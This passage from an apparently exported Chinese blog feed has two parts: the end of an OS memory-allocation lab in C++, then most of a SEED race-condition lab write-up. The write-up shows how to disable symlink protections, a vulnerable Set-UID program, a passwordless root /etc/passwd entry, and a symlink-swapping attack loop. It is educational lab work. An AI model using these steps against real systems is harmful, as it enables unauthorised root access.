&gt;&gt; work[i].page_num;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; work[i].page_num; j++)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入页&quot;</span> &lt;&lt; j &lt;&lt; <span class="hljs-string">&quot;所在的块为：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; work[i].<span class="hljs-built_in">list</span>[j];<br><span class="hljs-keyword">if</span> (bit_img[work[i].<span class="hljs-built_in">list</span>[j] / <span class="hljs-number">8</span>][work[i].<span class="hljs-built_in">list</span>[j] % <span class="hljs-number">8</span>] == <span class="hljs-number">1</span>) <span class="hljs-comment">//若该块被占用</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;该块已被占用，请重新输入&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>j--;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (work[i].<span class="hljs-built_in">list</span>[j] &gt; <span class="hljs-number">8</span> * byte_num)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;超过了主存大小，请重新输入&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>j--;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>bit_img[work[i].<span class="hljs-built_in">list</span>[j] / <span class="hljs-number">8</span>][work[i].<span class="hljs-built_in">list</span>[j] % <span class="hljs-number">8</span>] = <span class="hljs-number">1</span>;<br>free_block--;<br>&#125;<br>&#125;<br>display_page(i);<br>work[i].in = <span class="hljs-number">1</span>; <span class="hljs-comment">//标记存在于主存</span><br>&#125;<br>display_bit();<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//分配新作业</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">create</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> i = work_cnt + <span class="hljs-number">1</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入第&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;个作业的信息&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;编号：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; work[i].num;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;页个数：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; work[i].page_num;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; work[i].page_num; j++)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入页&quot;</span> &lt;&lt; j &lt;&lt; <span class="hljs-string">&quot;所在的块为：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; work[i].<span class="hljs-built_in">list</span>[j];<br><span class="hljs-keyword">if</span> (bit_img[work[i].<span class="hljs-built_in">list</span>[j] / <span class="hljs-number">8</span>][work[i].<span class="hljs-built_in">list</span>[j] % <span class="hljs-number">8</span>] == <span class="hljs-number">1</span>) <span class="hljs-comment">//若该块被占用</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;该块已被占用，请重新输入&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>j--;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (work[i].<span class="hljs-built_in">list</span>[j] &gt; <span class="hljs-number">8</span> * byte_num)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;超过了主存大小，请重新输入&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>j--;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>bit_img[work[i].<span class="hljs-built_in">list</span>[j] / <span class="hljs-number">8</span>][work[i].<span class="hljs-built_in">list</span>[j] % <span class="hljs-number">8</span>] = <span class="hljs-number">1</span>;<br>free_block--;<br>&#125;<br>&#125;<br>work[i].in = <span class="hljs-number">1</span>; <span class="hljs-comment">//标记存在于主存</span><br>work_cnt++;     <span class="hljs-comment">//作业个数增加</span><br>display_page(i);<br>display_bit();<br>&#125;<br><br><span class="hljs-comment">//回收作业</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">release</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> temp_num;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入要回收的作业：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; temp_num;<br><span class="hljs-type">int</span> pos; <span class="hljs-comment">//作业的位置</span><br><span class="hljs-comment">//寻找位置</span><br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt;= work_cnt; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (work[i].num == temp_num &amp;&amp; work[i].in) <span class="hljs-comment">//编号相同且作业存在于主存</span><br>&#123;<br>pos = i;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (i == work_cnt + <span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;作业&quot;</span> &lt;&lt; temp_num &lt;&lt; <span class="hljs-string">&quot;不存在于主存！&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; work[pos].page_num; i++)<br>&#123;<br>bit_img[work[pos].<span class="hljs-built_in">list</span>[i] / <span class="hljs-number">8</span>][work[pos].<span class="hljs-built_in">list</span>[i] % <span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;<br>free_block++;<br>&#125;<br>work[pos].in = <span class="hljs-number">0</span>; <span class="hljs-comment">//标记不存在于主存</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;回收成功！&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>display_bit();<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>init();<br><span class="hljs-type">int</span> op; <span class="hljs-comment">//操作号</span><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入操作（1:分配新作业 2:回收作业 0:结束）：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; op;<br><span class="hljs-keyword">if</span> (op == <span class="hljs-number">1</span>)<br>create();<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == <span class="hljs-number">2</span>)<br>release();<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;程序结束&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="程序运行时的初值及运行结果-1"><a href="#程序运行时的初值及运行结果-1" class="headerlink" title="程序运行时的初值及运行结果"></a>程序运行时的初值及运行结果</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h4><p>位示图的字节数：8<br>主存中作业的个数：2<br>第1个作业的信息<br>编号：1<br>页个数：6<br>页0所在的块为：0<br>页1所在的块为：1<br>页2所在的块为：9<br>页3所在的块为：11<br>页4所在的块为：13<br>页5所在的块为：24</p><p>第2个作业的信息<br>编号：2<br>页个数：4<br>页0所在的块为：4<br>页1所在的块为：5<br>页2所在的块为：6<br>页3所在的块为：31</p><p><img src="/2021/12/29/Allocation_and_recycling_of_main_storage_space/image-20211221103049356-165280353816611.png" alt="image-20211221103049356"></p><h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><p>分配新作业</p><p>第3个作业的信息<br>编号：3<br>页个数：5<br>页0所在的块为：2<br>页1所在的块为：10<br>页2所在的块为：18<br>页3所在的块为：26<br>页4所在的块为：34</p><p><img src="/2021/12/29/Allocation_and_recycling_of_main_storage_space/image-20211221103345163-165280354058412.png" alt="image-20211221103345163"></p><h4 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h4><p>回收作业2</p><p><img src="/2021/12/29/Allocation_and_recycling_of_main_storage_space/image-20211221103415599-165280354283513.png" alt="image-20211221103415599"></p><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><p>结合实际情况，参考书本，仔细考虑各种主存分配算法的优缺点。把主存分成大小相等的若干块，作业的信息也按块的大小分页，作业装入主存时把作业的信息按页分散存放在主存的空闲块中，这样很可能导致每个作业按页装入主存中时，某一页还存在一定的空闲空间，思考如何才能有效的利用这些空闲区域。</p><h3 id="各种主存分配算法"><a href="#各种主存分配算法" class="headerlink" title="各种主存分配算法"></a>各种主存分配算法</h3><ol><li><p>最先适应算法：地址递增，顺序查找，第一个能满足的即分配给进程。</p><p><strong>优点</strong>：最简单的，而且通常也是最好和最快的。</p><p><strong>缺点</strong>：会使得内存的低地址部分出现很多小的空闲分区，而每次分配查找时，都要经过这些分区，因此也增加了查找的开销。</p></li><li><p>邻近适应算法：循环首次适应算法。</p><p><strong>优点</strong>：比较块</p><p><strong>缺点</strong>：常常会导致在内存的末尾分配空间，分裂成小碎片。</p></li><li><p>最佳适应算法：容量递增，找到第一个能满足要求的空闲分区。</p><p><strong>优点</strong>：每次分配给文件的都是最合适该文件大小的分区。</p><p><strong>缺点</strong>：内存中留下许多难以利用的小的空闲区。</p></li><li><p>最坏适应算法：容量递减，找到第一个能满足要求的分区。</p><p><strong>优点</strong>：尽可能地利用存储器中大的空闲区。</p><p><strong>缺点</strong>：容易导致没有可用的大的内存块造成浪费。</p></li></ol><p>空闲空间可以通过紧凑来解决，就是操作系统不时地对进程作业进行移动和整理。</p><h2 id="实验心得"><a href="#实验心得" class="headerlink" title="实验心得"></a>实验心得</h2><ol><li>第一个实验Allocation_and_recycling_of_main_storage_space算法实现的关键点就在于置换算法的设计。了解该算法后，选用合适的数据结构作为内存中的页队列，并按照算法思想对队列进行维护即可。通过该实验，我对Allocation_and_recycling_of_main_storage_space及其他置换算法有了更加深入的理解。</li><li>第二个实验涉及主存空间的分配和回收。最先适应算法中，需要对保存作业条目和空闲区条目的结构体有合理的设计，并根据算法流程图，在合并空闲区时考虑准确和全面。关于位示图的实现，则也是使用结构体数组保存作业条目。这些实现也需要考虑输入输出的人性化和美观性。通过该实验，我对各种主存分配算法也有了更深刻的理解。</li></ol>]]></content>
    
    
    <categories>
      
      <category>操作系统课程实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Race Condition Vulnerability Lab</title>
    <link href="/2021/12/11/Race_Condition_Vulnerability_Lab/"/>
    <url>/2021/12/11/Race_Condition_Vulnerability_Lab/</url>
    
    <content type="html"><![CDATA[<h1 id="Race-Condition-Vulnerability-Lab"><a href="#Race-Condition-Vulnerability-Lab" class="headerlink" title="Race_Condition_Vulnerability_Lab"></a>Race_Condition_Vulnerability_Lab</h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h2><p>​        本实验的学习目标是让学生通过将他们从课堂上学到的关于漏洞的知识付诸行动，获得关于竞争条件漏洞的第一手经验。当多个进程同时访问和操作相同的数据时，就会出现竞争条件，并且执行的结果取决于访问发生的特定顺序。 如果特权程序存在竞争条件漏洞，攻击者可以运行一个并行进程来与特权程序“竞争”，意图改变程序的行为。<br>​        在这个实验室中，学生将获得一个具有竞争条件漏洞的程序； 他们的任务是开发一个利用漏洞并获得root权限的方案。 除了攻击之外，还将指导学生了解几种可用于对抗竞争条件攻击的保护方案。<br>​        学生需要评估这些计划是否有效并解释原因。 本实验涵盖以下主题：</p><ul><li>竞争条件漏洞</li><li>粘滞符号链接保护</li><li>最小特权原则</li></ul><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p> SEED Ubuntu 20.04 </p><h2 id="2-环境配置"><a href="#2-环境配置" class="headerlink" title="2 环境配置"></a>2 环境配置</h2><h3 id="2-1-关闭对策"><a href="#2-1-关闭对策" class="headerlink" title="2.1 关闭对策"></a>2.1 关闭对策</h3><p>Ubuntu 具有针对竞争条件攻击的内置保护。 该方案通过限制谁可以遵循符号链接来工作。 根据文档，“如果跟随者和目录所有者都与符号链接所有者不匹配，则全局可写的粘滞目录（例如 <code>/tmp</code>）中的符号链接无法被跟随 。”  </p><p>Ubuntu 20.04 引入了另一种安全机制，可防止 root 写入 <code>/tmp</code> 中属于其他人的文件。 在本实验中，我们需要禁用这些保护。 您可以使用以下命令来实现：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sysctl -w fs.protected_symlinks=0</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sysctl fs.protected_regular=0</span><br></code></pre></div></td></tr></table></figure><h4 id="实验操作"><a href="#实验操作" class="headerlink" title="实验操作"></a>实验操作</h4><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211190522204.png" alt="image-20211211190522204"></p><h3 id="2-2-一个易受攻击的程序"><a href="#2-2-一个易受攻击的程序" class="headerlink" title="2.2 一个易受攻击的程序"></a>2.2 一个易受攻击的程序</h3><p>下面的程序是一个看似无害的程序。 它包含一个竞争条件漏洞。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//vulp.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> * fn = <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">60</span>];<br>    FILE *fp;<br>    <span class="hljs-comment">/* get user input */</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%50s&quot;</span>, buffer )<br>    <span class="hljs-keyword">if</span>(!access(fn, W_OK))&#123; ① <br>    fp = fopen(fn, <span class="hljs-string">&quot;a+&quot;</span>);  ②<br>    fwrite(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-number">1</span>, fp);<br>    fwrite(buffer, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-built_in">strlen</span>(buffer), fp);<br>    fclose(fp);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No permission \n&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>上面的程序是一个root拥有的Set-UID程序； 它将用户输入的字符串附加到临时文件<code>/tmp/XYZ</code>的末尾。 由于代码以 root 权限运行，即其有效用户 ID 为0，因此它可以覆盖任何文件。</li><li>为防止自己不小心覆盖别人的文件，程序首先检查真实用户ID是否具有<code>/tmp/XYZ</code>文件的访问权限；这就是第 ① 行中 <code>access()</code> 调用的目的。 如果真实用户 ID 确实具有权限，则程序在第 ② 行打开文件并将用户输入附加到文件中。</li><li>乍一看该程序似乎没有任何问题。 但是这个程序存在竞争条件漏洞：由于检查（<code>access</code>）和使用（<code>fopen</code>）之间的时间窗口，存在<code>access()</code>使用的文件与<code>fopen()</code>使用的文件不同的可能性，即使它们具有相同的文件名<code>/tmp/XYZ</code>. 如果恶意攻击者可以在时间窗口内以某种方式使<code>/tmp/XYZ</code>成为指向受保护文件（例如 <code>/etc/passwd</code>）的符号链接，则攻击者可以将用户输入附加到 <code>/etc/passwd</code>，从而获得root权限。 易受攻击的程序以<code>root</code>权限运行，因此它可以覆盖任何文件。</li></ul><h4 id="设置-Set-UID-程序"><a href="#设置-Set-UID-程序" class="headerlink" title="设置 Set-UID 程序"></a>设置 Set-UID 程序</h4><p>我们首先编译上面的代码，把它的二进制文件变成一个由root拥有的Set-UID程序。 以下命令可实现此目标：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc vulp.c -o vulp</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chown</span> root vulp</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chmod</span> 4755 vulp</span><br></code></pre></div></td></tr></table></figure><h5 id="实验操作-1"><a href="#实验操作-1" class="headerlink" title="实验操作"></a>实验操作</h5><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211191832955.png" alt="image-20211211191832955"></p><h2 id="3-任务1：选择我们的目标"><a href="#3-任务1：选择我们的目标" class="headerlink" title="3 任务1：选择我们的目标"></a>3 任务1：选择我们的目标</h2><p>​        我们想利用程序中的竞争条件漏洞。 我们选择以普通用户不可写的密码文件<code>/etc/passwd</code>为目标。 通过利用该漏洞，我们希望在密码文件中添加一条记录，目的是创建一个具有 root 权限的新用户帐户。<br>在密码文件中，每个用户都有一个条目，该条目由七个以冒号 (:) 分隔的字段组成。 下面列出了 root 用户的条目。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">root:x:0:0:root:/root:/bin/bash<br></code></pre></div></td></tr></table></figure><ul><li>对于 root 用户，第三个字段（用户 ID 字段）的值为零。 即，当root用户登录时，其进程的用户ID设置为零，赋予该进程root权限。 基本上，root 帐户的权力不来自其名称，而是来自用户 ID 字段。 如果我们想创建一个具有 root 权限的帐户，我们只需要在这个字段中输入一个零。</li><li>每个条目还包含一个密码字段，这是第二个字段。 在上面的示例中，该字段设置为“x”，表示密码存储在另一个名为<code>/etc/shadow</code>（影子文件）的文件中。</li><li>如果我们按照这个例子，我们必须使用竞争条件漏洞来修改密码和影子文件，这不是很难做到。 但是，有一个更简单的解决方案。 我们可以简单地将密码放在那里，而不是将“x”放在密码文件中，这样操作系统就不会从影子文件中查找密码。</li><li>密码字段不保存实际密码； 它保存密码的单向哈希值。</li><li>要为给定的密码获取这样的值，我们可以使用<code>adduser</code>命令在我们自己的系统中添加一个新用户，然后从影子文件中获取我们密码的单向哈希值。 或者我们可以简单地从种子用户的条目中复制值，因为我们知道它的密码是 <code>dees</code>。 有趣的是，Ubuntu live CD 中有一个用于无密码帐户的魔法值，该魔法值是<code>U6aMy0wojraho</code>（第 6 个字符为零，不是字母 O）。 如果我们将此值放在用户条目的密码字段中，我们只需要在提示输入密码时按回车键。</li></ul><h3 id="小任务"><a href="#小任务" class="headerlink" title="小任务"></a>小任务</h3><ul><li><p>为了验证魔法密码是否有效，我们手动（作为超级用户）将以下条目添加到<code>/etc/passwd</code>文件的末尾。 请查看是否可以无需输入密码登录测试帐户，且是否拥有root权限。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">test:U6aMy0wojraho:0:0:test:/root:/bin/bash<br></code></pre></div></td></tr></table></figure></li><li><p>完成此任务后，请从密码文件中删除此条目。 在接下来的任务中，我们需要以普通用户的身份来实现这个目标。 显然，我们不允许直接对密码文件执行此操作，但我们可以利用特权程序中的竞争条件来实现相同漏洞的目标。</p></li></ul><h3 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h3><p>过去，一些学生在攻击过程中不小心清空了<code>/etc/passwd</code>文件（这可能是由操作系统内核内部的一些竞争条件问题引起的）。 如果您丢失了密码文件，您将无法再次登录。 为避免此问题，请复制原始密码文件或拍摄 VM 快照。 这样，您就可以轻松地从事故中恢复过来。</p><h3 id="实验操作-2"><a href="#实验操作-2" class="headerlink" title="实验操作"></a>实验操作</h3><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211193423680.png" alt="image-20211211193423680"></p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211193557954.png" alt="image-20211211193557954"></p><h2 id="4-任务2：发起竞争条件攻击"><a href="#4-任务2：发起竞争条件攻击" class="headerlink" title="4 任务2：发起竞争条件攻击"></a>4 任务2：发起竞争条件攻击</h2><p>​        此任务的目标是利用前面列出的易受攻击的 Set-UID 程序中的竞争条件漏洞。 最终目的是获得root权限。 攻击最关键的一步，使<code>/tmp/XYZ</code>指向密码文件，必须发生在检查和使用之间的窗口内； 即在易受攻击的程序中的<code>access</code>和<code>fopen</code>调用之间。</p><h3 id="4-1-任务-2-A：模拟慢速机器"><a href="#4-1-任务-2-A：模拟慢速机器" class="headerlink" title="4.1 任务 2.A：模拟慢速机器"></a>4.1 任务 2.A：模拟慢速机器</h3><p>​        让我们假设机器很慢，在 <code>access()</code>和<code>fopen()</code>调用之间有 10 秒的时间窗口。 为了模拟这一点，我们在它们之间添加了一个 <code>sleep(10)</code>。 该程序将如下所示：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!access(fn, W_OK)) &#123;<br>    sleep(<span class="hljs-number">10</span>);<br>    fp = fopen(fn, <span class="hljs-string">&quot;a+&quot;</span>);<br>    ...<br></code></pre></div></td></tr></table></figure><ul><li>有了这个添加，<code>vulp</code> 程序（重新编译时）将暂停并将控制权交给操作系统 10 秒钟。 你的工作是手动做一些事情使程序在 10 秒后恢复时，程序可以帮助你向系统添加一个 root 帐户。 请演示您将如何实现这一目标。</li></ul><p>​        您将无法修改文件名 <code>/tmp/XYZ</code>，因为它在程序中是硬编码的，但您可以使用符号链接来更改此名称的含义。 例如，您可以将<code>/tmp/XYZ</code> 设为指向<code>/dev/null</code> 文件的符号链接。 当您写入<code>/tmp/XYZ</code> 时，实际内容将写入 <code>/dev/null</code>。 请参见以下示例（“f”选项表示如果链接存在，则先删除旧链接）：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ln</span> -sf /dev/null /tmp/XYZ</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span> -ld /tmp/XYZ</span><br>lrwxrwxrwx 1 seed seed 9 Dec 25 22:20 /tmp/XYZ -&gt; /dev/null<br></code></pre></div></td></tr></table></figure><h4 id="实验操作-3"><a href="#实验操作-3" class="headerlink" title="实验操作"></a>实验操作</h4><ol><li><p>更改<code>vulp.c</code>，重新编译，设为root所有的<code>setuid</code>程序。</p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211194656855.png" alt="image-20211211194656855"></p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211194743280.png" alt="image-20211211194743280"></p></li><li><p>将<code>/tmp/XYZ</code>设为指向<code>/dev/null</code> 文件（权限位为<code>rw-rw-rw-</code>）的符号链接。</p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211202246049.png" alt="image-20211211202246049"></p></li><li><p>运行<code>vulp</code>。用户输入为我们要写入<code>/etc/passwd</code>的字符串：<code>test:U6aMy0wojraho:0:0:test:/root:/bin/bash</code>，回车结束输入</p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211202524702.png" alt="image-20211211202524702"></p></li><li><p>在提供输入后的十秒内，执行命令<code>ln -sf /etc/passwd /tmp/XYZ</code>，使<code>/tmp/XYZ</code>指向密码文件。</p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211202536770.png" alt="image-20211211202536770"></p></li><li><p>打开<code>/etc/passwd</code>，可以看到多了一行我们的输入。</p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211202721182.png" alt="image-20211211202721182"></p></li><li><p>同样，切换用户至<code>test</code>，无需密码即可获得root权限。</p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211202833736.png" alt="image-20211211202833736"></p></li></ol><h3 id="4-2-任务-2-B：真正的攻击"><a href="#4-2-任务-2-B：真正的攻击" class="headerlink" title="4.2 任务 2.B：真正的攻击"></a>4.2 任务 2.B：真正的攻击</h3><p>​        在之前的任务中，我们通过要求易受攻击的程序放慢速度来“欺骗”，这样我们就可以发起攻击。 这绝对不是真正的攻击。</p><p>​        在这个任务中，我们将发起真正的攻击。 在做任务前，确保从 <code>vulp</code> 程序中删除了 sleep() 语句。</p><p>​        竞争条件攻击的典型策略是与目标程序并行运行攻击程序，希望能够在那个时间窗口内完成关键步骤。 不幸的是，完美的时机很难实现，所以攻击的成功只是概率。 如果窗口很小，攻击成功的概率可能很低，但我们可以多次运行攻击。 我们只需要袭击到一次竞争条件窗口。</p><h3 id="编写攻击程序"><a href="#编写攻击程序" class="headerlink" title="编写攻击程序"></a>编写攻击程序</h3><p>​        在模拟攻击中，我们使用<code>ln-s</code>命令创建/更改符号链接。现在我们需要在一个程序中完成它。我们可以在C中使用<code>symlink()</code>来创建符号链接。由于Linux不允许在链接已经存在的情况下创建链接，因此我们需要先删除旧链接。下面的C代码片段显示了如何删除链接，然后使<code>/tmp/XYZ</code>指向<code>/etc/passwd</code>。请编写您的攻击程序。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">unlink(<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>);<br>symlink(<span class="hljs-string">&quot;/etc/passwd&quot;</span>,<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>);<br></code></pre></div></td></tr></table></figure><h4 id="实验操作-4"><a href="#实验操作-4" class="headerlink" title="实验操作"></a>实验操作</h4><p>攻击程序<code>attack_process.c</code>如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//attack_process.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        unlink(<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>);<br>        symlink(<span class="hljs-string">&quot;/dev/null&quot;</span>,<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>);<br>        usleep(<span class="hljs-number">1000</span>);<br> <br>        unlink(<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>);<br>        symlink(<span class="hljs-string">&quot;/etc/passwd&quot;</span>,<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>);<br>        usleep(<span class="hljs-number">1000</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="运行易受攻击的程序并监视结果"><a href="#运行易受攻击的程序并监视结果" class="headerlink" title="运行易受攻击的程序并监视结果"></a>运行易受攻击的程序并监视结果</h3><p>​        由于我们需要多次运行易受攻击的程序，因此我们将编写一个程序来自动化此过程。为了避免手动向易受攻击的程序<code>vulp</code>键入输入，我们可以使用输入重定向。也就是说，我们将输入保存在一个文件中，并要求<code>vulp</code>使用<code>vulp&lt;inputFile</code>从该文件获取输入。我们也可以使用管道（稍后将给出一个示例）。<br>​        